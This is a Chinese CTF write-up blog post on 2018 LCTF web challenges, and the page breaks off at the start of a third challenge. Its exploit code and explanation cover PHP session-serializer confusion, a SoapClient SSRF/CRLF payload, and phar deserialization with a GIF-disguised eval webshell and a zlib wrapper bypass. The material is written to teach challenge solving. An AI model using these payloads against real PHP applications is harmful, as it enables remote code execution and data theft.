<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>
    LCTF wp | 道萝岗特森&#39;s Blog
  </title>
  <meta name="description" content="hello world">
  
  <meta name="keywords" content="
  writeup
  ">
  
  <meta name="author" content="daolgts">

  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="theme-color" content="#1e2327">
  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">

  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  

  
<script>
  var _hmt = _hmt || [];
  (function(){var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
</script>


  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
</head>

<body id="replica-app">

<nav class="navbar-wrapper">
  <div class="navbar">
    <div class="container clearfix">
      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>

      <div class="navbar-search float-left desktop-only">
        <div class="navbar-search-form">
          <label for="gsc-i-id1">This website</label>
          <div id="google-search">
            <gcse:search></gcse:search>
          </div>
        </div>
      </div>

      <ul class="navbar-nav float-left">
        
        <li><a href="/archives">Archives</a></li>
        
        <!--  -->
        
        <li><a href="/tags">Tags</a></li>
        
        
          <li><a href="/links">Links</a></li>
        
        
          <li><a href="/about">About</a></li>
        
        
      </ul>

      <ul class="navbar-nav user-nav float-right desktop-only">
        <li class="user-nav-notification">
          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
        </li>
        <li>
          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
        </li>
        <li class="user-nav-logo">
          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
        </li>
      </ul>
    </div>
  </div>
</nav>

<div class="main-container">
  <header class="header-wrapper desktop-only">
  <div class="container header-site-detail">
    <ul class="header-toolbar">
      <li class="clearfix">
        <a href="/archives" class="header-toolbar-left"><i
                  class="fa fa-file-text"></i> Posts </a>
        <a href="/archives"
           class="header-toolbar-right"> 42 </a>
      </li>
      <li>
        <a href="/tags" class="header-toolbar-left"><i
                  class="fa fa-tags"></i> Tags </a>
        <a href="/tags"
           class="header-toolbar-right"> 22 </a>
      </li>
      <li>
        <a href="/categories" class="header-toolbar-left"><i
                  class="fa fa-folder-open"></i> Categories </a>
        <a href="/categories"
           class="header-toolbar-right"> 0 </a>
      </li>
    </ul>
    <h2 class="header-title">
      <i class="fa fa-book text-muted"></i>
      <a href="/">道萝岗特森&#39;s Blog</a>
      
      
    </h2>
  </div>

  <div class="container">
    <div class="header-tab-wrapper clearfix">
      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
    </div>
  </div>
</header>


<div class="post-container container">
  <h3>
    <i class="fa fa-user-o"></i>
    daolgts

    <span class="post-date float-right" title="{{moment(1547644374000).format('MMM DD, YYYY, h:mm:ss A')}}">
      <i class="fa fa-pencil-square-o"></i>
      {{moment(1547644374000).fromNow()}}
    </span>
  </h3>

  <article class="post-content">
    <h1>LCTF wp</h1>
    <h2 id="2018LCTF"><a href="#2018LCTF" class="headerlink" title="2018LCTF"></a>2018LCTF</h2><h3 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h3><p>思路：session反序列化-&gt;soap类(ssrf+crlf)-&gt;call_user_func激活soap类</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>

<p>访问<code>flag.php</code>会把flag写入session中，但是需要从本地访问，也就是需要触发ssrf，而且需要带着自己的sessionid，才能写到自己的session中</p>
<p>可以利用php的原生类soap进行反序列化触发ssrf，同时触发crlf修改cookie来设置sessionid</p>
<h4 id="PHP-session-反序列化漏洞"><a href="#PHP-session-反序列化漏洞" class="headerlink" title="PHP session 反序列化漏洞"></a>PHP session 反序列化漏洞</h4><p>PHP中的Session的实现是没有的问题，但如果在PHP在<strong>反序列化存储的$_SESSION数据时使用的引擎</strong>和<strong>序列化使用的引擎</strong>不一样，会导致数据无法正确的反序列化</p>
<p>简单来说就是存session用了<code>php_serialize</code>引擎，存的session就是<code>a:1:{s:4:&quot;name&quot;;s:24:&quot;|&lt;serialize data&gt;}</code></p>
<p>而读取session时用了默认的php引擎，以<code>|</code>为分割，读取为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:4:"</span>name<span class="string">";s:145:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(SoapClient)#2 (4) &#123;</span></span><br><span class="line"><span class="string">    ["</span>uri<span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">    string(3) "</span><span class="number">123</span><span class="string">"</span></span><br><span class="line"><span class="string">    ["</span>location<span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">    string(25) "</span>http:<span class="comment">//127.0.0.1/flag.php"</span></span><br><span class="line">    [<span class="string">"_user_agent"</span>]=&gt;</span><br><span class="line">    string(<span class="number">3</span>) <span class="string">"abc"</span></span><br><span class="line">    [<span class="string">"_soap_version"</span>]=&gt;</span><br><span class="line">    int(<span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是触发了反序列化</p>
<p>利用session_start()的参数修改反序列化引擎，将序列化数据注入到sessionfile中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/soap.php?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A35%3A%22abc%0D%0ACookie%3A+PHPSESSID%3D8nsujaq7o5tl0btee8urnlsrb4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br><span class="line"></span><br><span class="line">serialize_handler=php_serialize</span><br></pre></td></tr></table></figure>

<p>生成反序列化数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                              <span class="string">'user_agent'</span> =&gt; <span class="string">"abc\r\nCookie: PHPSESSID=8nsujaq7o5tl0btee8urnlsrb3\r\n"</span>,</span><br><span class="line">                              <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure>

<h4 id="利用第二个call-user-func激活soap类"><a href="#利用第二个call-user-func激活soap类" class="headerlink" title="利用第二个call_user_func激活soap类"></a>利用第二个call_user_func激活soap类</h4><p><code>$_SESSION</code>里的数据是soap对象，再经过<code>reset()</code>弹出这个对象成为了<code>$a[0]</code>，可以通过变量覆盖<code>$b</code>为<code>call_user_func</code>，调用<code>$a</code>中的这个对象，从而触发soap的网络请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/soap.php?f=extract</span><br><span class="line"></span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure>

<p>soap请求发出后，构造soap序列化的可控phpsessid相应的session里被加入了flag</p>
<p>带着这个phpsessid请求index.php，中间有一行代码var_dump($_SESSION);从而拿到flag</p>
<p><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">https://xz.aliyun.com/t/3336</a></p>
<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
<h3 id="T4lk-1s-ch34p-sh0w-m3-the-sh31l"><a href="#T4lk-1s-ch34p-sh0w-m3-the-sh31l" class="headerlink" title="T4lk 1s ch34p,sh0w m3 the sh31l"></a>T4lk 1s ch34p,sh0w m3 the sh31l</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$SECRET  = `../read_secret`;                                   </span><br><span class="line">$SANDBOX = <span class="string">"../data/"</span> . md5($SECRET. $_SERVER[<span class="string">"REMOTE_ADDR"</span>]); </span><br><span class="line">$FILEBOX = <span class="string">"../file/"</span> . md5(<span class="string">"K0rz3n"</span>. $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);    </span><br><span class="line">@mkdir($SANDBOX); </span><br><span class="line">@mkdir($FILEBOX); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123; </span><br><span class="line">    $data = serialize(<span class="keyword">new</span> User($SANDBOX)); </span><br><span class="line">    $hmac = hash_hmac(<span class="string">"md5"</span>, $data, $SECRET); </span><br><span class="line">    setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));       </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $avatar; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = $path;                                           </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n_secret_flag</span> </span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $file_path; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|read_secret|history|class)/i'</span>, <span class="keyword">$this</span>-&gt;file_path))&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry Sorry Sorry"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    <span class="keyword">include_once</span>(<span class="keyword">$this</span>-&gt;file_path); </span><br><span class="line"> &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $SECRET; </span><br><span class="line">    $data = $_COOKIE[<span class="string">"session-data"</span>]; </span><br><span class="line">    <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"md5"</span>, $data, $SECRET), $hmac) )&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    $data = unserialize($data); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $data-&gt;avatar;                                                </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123; </span><br><span class="line">         <span class="keyword">if</span>(preg_match(<span class="string">'/^(http|https).*/i'</span>, $_GET[<span class="string">'url'</span>]))&#123; </span><br><span class="line">            $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);                                                                                     </span><br><span class="line">            <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)&#123; </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"Fuck off"</span>); </span><br><span class="line">            &#125; </span><br><span class="line">            file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data); </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Upload OK"</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker"</span>); </span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Miss the URL~~"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> ( !is_dir($path) || !file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123; </span><br><span class="line"></span><br><span class="line">        $path = <span class="string">"/var/www"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    header(<span class="string">"Content-Type: image/gif"</span>); </span><br><span class="line">    <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));                      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($path)</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i'</span>,$_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker Hacker Hacker"</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            $file_path = $_GET[<span class="string">'c'</span>]; </span><br><span class="line">            <span class="keyword">list</span>($width, $height, $type) = @getimagesize($file_path); </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Width is ："</span> . $width.<span class="string">" px&lt;br&gt;"</span> . </span><br><span class="line">                <span class="string">"Height is ："</span> . $height.<span class="string">" px&lt;br&gt;"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">list</span>($width, $height, $type) = @getimagesize($path.<span class="string">"/avatar.gif"</span>); </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Width is ："</span> . $width.<span class="string">" px&lt;br&gt;"</span> . </span><br><span class="line">            <span class="string">"Height is ："</span> . $height.<span class="string">" px&lt;br&gt;"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span><span class="params">($source_path,$dest_name)</span></span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $FILEBOX; </span><br><span class="line">    $dest_path = $FILEBOX . <span class="string">"/"</span> . $dest_name; </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i'</span>,$source_path))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Hacker Hacker Hacker"</span>); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(copy($source_path,$dest_path))&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Successful copy"</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Copy failed"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>)&#123; </span><br><span class="line">     upload(check_session()); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>)&#123; </span><br><span class="line">    show(check_session()); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"check"</span>)&#123; </span><br><span class="line">    check(check_session()); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($mode == <span class="string">"move"</span>)&#123; </span><br><span class="line">    move($_GET[<span class="string">'source'</span>],$_GET[<span class="string">'dest'</span>]); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./comments.html"</span>);</span><br></pre></td></tr></table></figure>

<h4 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p>phar文件会以序列化的形式存储用户自定义的meta-data，在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p>
<p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png" alt="image"></p>
<p>这里触发反序列化是用到了getimagesize($file_path)这个函数</p>
<p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码,可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件</p>
<p><code>compress.zlib://phar//./</code>来绕过<code>^phar</code>的正则检测</p>
<ol>
<li>直接在文件头处写一句话getshell</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n_secret_flag</span> </span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $file_path = <span class="string">'/var/www/data/dccb75e38fe3fc2c70fd169f263e6d37/avatar.gif'</span>;  </span><br><span class="line">&#125; </span><br><span class="line">$a = <span class="keyword">new</span> K0rz3n_secret_flag();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a&lt;?php echo 1;eval($_GET["a"]);?'</span>.<span class="string">'&gt;&lt;?php __HALT_COMPILER(); ?'</span>.<span class="string">'&gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>upload上传然后check触发phar反序列化</p>
<ol start="2">
<li>先上传要被include的webshell为avatar.gif，再上传phar文件包含这个webshell（<code>K0rz3n_secret_flag</code>类中的<code>include_once</code>）</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n_secret_flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $file_path=<span class="string">'/var/www/data/67bf5ff3cfa1cdd00f700328698c2adb/avatar.gif'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|read_secret|history|class)/i'</span>, <span class="keyword">$this</span>-&gt;file_path))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry Sorry Sorry"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="keyword">$this</span>-&gt;file_path);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">$a= <span class="keyword">new</span> K0rz3n_secret_flag;</span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($a);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'avatar.gif'</span>);</span><br></pre></td></tr></table></figure>

<h3 id="sh0w-m3-the-sh31l-4ga1n"><a href="#sh0w-m3-the-sh31l-4ga1n" class="headerlink" title="sh0w m3 the sh31l 4ga1n"></a>sh0w m3 the sh31l 4ga1n</h3><p>比起第一道题的正则多了一个data,所以phar://就不能读取data目录下的内容了</p>
<p>生成SECRET的语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$SECRET=`../read_secret`;</span><br></pre></td></tr></table></figure>

<p>并不是可执行程序或bash文件，只是一堆字符串，那么这个东西返回的永远是null即<code>$SECRET==NULL</code></p>
<p>于是在<code>check_session</code>中$data可控并且能满足hmac的验证，所以修改<code>session-data</code>的值能修改upload文件的路径</p>
<p>生成<code>session-data</code>：</p>
